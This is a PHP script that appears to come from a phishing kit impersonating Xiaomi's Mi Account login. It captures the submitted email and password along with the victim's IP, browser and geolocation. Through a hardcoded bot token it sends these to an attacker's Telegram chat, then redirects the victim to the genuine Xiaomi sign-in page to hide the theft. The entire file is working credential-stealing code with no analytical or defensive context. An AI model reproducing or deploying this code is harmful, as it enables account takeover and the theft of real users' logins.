<?php
function getUserIP()
{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	}
	else if (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	}
	else {
		$ip = $remote;
	}

	return $ip;
}
$ID = (empty($_GET['ID']) ? NULL : $_GET['ID']);
$v = (empty($_GET['v']) ? NULL : $_GET['v']);
$accessed = file_get_contents('../access.txt');
$email = $_POST['ID'];
$pass = $_POST['password'];
//$isp = geoip_isp_by_name($hostname);    
$ip_address = $_SERVER['REMOTE_ADDR'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip_address"));
//$url = file_get_contents("http://whatismyipaddress.com/ip/$ip_address");
//preg_match_all('/<th>(.*?)<\/th><td>(.*?)<\/td>/s',$url,$output,PREG_SET_ORDER);    
//$isp = $output[3][2]; 
$country = $geo["geoplugin_countryName"]; //Country
$region = $geo["geoplugin_regionName"]; //Region
$protocol = $_SERVER['SERVER_PROTOCOL']; 
$headers  = 'MIME-Version: 1.0' . "\r\n";    
$headers .= 'From:iOServer<noreply@ioserver.com>' . "\r\n";  
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
include '../notif.php';
$agent = $_SERVER['HTTP_USER_AGENT'];
$names = '@iOServer';
$user_ip = getuserip();

//Notif by Telegram BOT
$token = "474892305:AAE6VOEBxf47R7FxuKVR4l85m_GRsQJ6_rA"; // Token of TELEGRAM API
$arr_passcode = array(    
"😍<b>Got Gift</b>😍",
"%0A".
"👉Mi Account👈".
"%0A".
"Email : $ID",
"Random : $v",
"%0A".
"Email: $email",
"Password: $pass",
"%0A".
"Country : $country",
"Region : $region",
"Browser : $agent",
"IP Address : $user_ip",
"%0A".
"KEEP SUPPORTING 👉 $names%C2%AE",);   
foreach($arr_passcode as $value) { 
     $txt_passcode .= "".$value."%0A"; 
  }    
$fp=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_passcode}","r");

$path_to_file = '../access.txt';
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace($ID, ',', $file_contents);
$file_contents = str_replace($v, ',', $file_contents);
file_put_contents($path_to_file, $file_contents);


	
echo '<!DOCTYPE html>' .
'<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">'.'</head>' . "\n" . 
'<body>'.
'<script type="text/javascript">
            window.location.replace("https://account.xiaomi.com/pass/serviceLogin?callback=https%3A%2F%2Fi.mi.com%2Fsts%3Fsign%3DmF32YtfY7XReThOa0pZzXhZXJ0U%253D%26followup%3Dhttps%253A%252F%252Fi.mi.com%252F%26sid%3Di.mi.com&sid=i.mi.com&_locale=en_US&_snsNone=true");
</script>'.
'</body>' . "\n" . 
'</html>' . "\n";
?>